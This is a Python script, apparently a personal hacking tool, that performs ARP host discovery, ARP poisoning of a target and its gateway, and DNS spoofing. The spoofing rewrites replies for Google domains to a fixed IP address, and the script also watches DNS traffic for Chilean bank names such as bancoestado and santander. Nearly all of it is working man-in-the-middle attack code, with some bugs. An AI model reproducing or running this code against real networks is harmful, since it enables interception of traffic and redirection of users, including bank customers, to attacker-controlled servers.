from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import requests
import signal 

dns_hosts = {
    b"www.google.com." : "144.217.66.188",
    b"google.com." : "144.217.66.188",
    b"google.cl." : "144.217.66.188",
    b"www.google.cl." : "144.217.66.188"
}

def handler(signum, frame):
    sys.exit(0)

def get_details(hosts):
    hosts_details = []
    for ip in hosts:
        mac = get_mac(ip)
        vendor = requests.get('http://api.macvendors.com/' + mac).text
        hosts_details.append((ip, mac, vendor))
        time.sleep(1)
    return hosts_details

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    # return the MAC address from a response
    for s,r in responses:
        if r[Ether].src != None:
            return r[Ether].src
        else:
            print "[!!!] Cant obtain MAC gateway. Exiting."
            break
        return None

def hosts_discovery(subnet):
    print "[*] Starting Host-discovery"
    print "[*] Method-man: ARP requests"
    target_subnet = subnet
    hosts_live = []
    """
    Se utiliza el metodo de enviar peticiones a las tablas ARP
    consultando por las MAC de todas las ip de una subnet
    """
    for _ in [1, 1, 1]:
        responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_subnet),timeout=2)
        for s,r in responses:
            if r[ARP].psrc != None :
                if r[ARP].psrc not in hosts_live:
                    hosts_live.append(r[ARP].psrc)

    return get_details(hosts_live)

def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    # slightly different method using send
    print "[*] restoring network..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    # signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT)

def poisoner(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst= target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst= gateway_mac

    print "[*] Starting ARP-Poisoning. [CTRL-C to stop]"

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            print "CTRL-C Detected!"
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
            print "[*] Finished ARP-Poisoning atack"
    return


def raw_verify(packet):
    """
    Verifica que el paquete contiene payload o data.
    """
    try:
        if Raw in packet :
            # Drop all packets coming from this IP
            print "The packet contains raw payload."
            #content = packet[Raw].load
            print packet.hexraw()
            payload.set_verdict(nfqueue.NF_ACCEPT)
        else:
            # Let the rest go it's way
            payload.set_verdict(nfqueue.NF_ACCEPT)
        # If you want to modify the packet, copy and modify it with scapy then do :
        #payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(packet), len(packet))    
    except KeyboardInterrupt:
        return


def print_and_accept_dnsQr(pkt):
    try:
        print "flag flagl flag flag"
        recon_webs = ["bancoestado", "google", "santander", "facebook", "www", "ww3", "chile","bancochile","es"]
        data = pkt.get_payload()
        packet = IP(data) #crearmos objeto scapy IP
        if packet.haslayer(DNSRR):
            qname = packet[DNSQR].qname
            for aux in recon_webs:
                if aux in qname.split('.'):
                    print (packet.summary())
                    #print "[*] -> %s <- [*]" % qname
            pkt.accept()
        else:
            pkt.accept()
    except KeyboardInterrupt:
        sys.exit(0)



def print_packet(pkt):
    data = pkt.get_payload()
    packet = IP(data) #crearmos objeto scapy IP
    if packet.haslayer(DNSRR):
        #qname = packet[DNSQR].qname
        print packet[DNSRR].show()
        pkt.accept()
    else:
        pkt.accept()

def modify_dns(pkt):
    data = pkt.get_payload()
    packet = IP(data)
    if packet.haslayer(DNSRR):
        qname = packet[DNSQR].qname
        if qname not in dns_hosts:
            print("no modification:", qname)
            pkt.accept()
        else:
            # craft new answer, overriding the original
            # setting the rdata for the IP we want to redirect (spoofed)
            packet[DNS].an = DNSRR(rrname=qname, rdata="185.88.181.9")
            # set the answer count to 1
            packet[DNS].ancount = 1
            # delete checksums and length of packet, because we have modified the packet
            # new calculations are required ( scapy will do automatically )
            del packet[IP].len
            del packet[IP].chksum
            del packet[UDP].len
            del packet[UDP].chksum
            # return the modified packet
            pkt.set_payload(str(packet))
            pkt.accept()
    else:
        pkt.accept()

def troll(pkt):
    pkt.drop()

def intercepter():
    print "[*] Starting intercepter..." 
    Queue_num = 0
    queue = NetfilterQueue()
    queue.bind(Queue_num, print_and_accept_dnsQr)
    netfilterQueue_thread = threading.Thread(target=queue.run())
    netfilterQueue_thread.start()

    queue.unbind()

    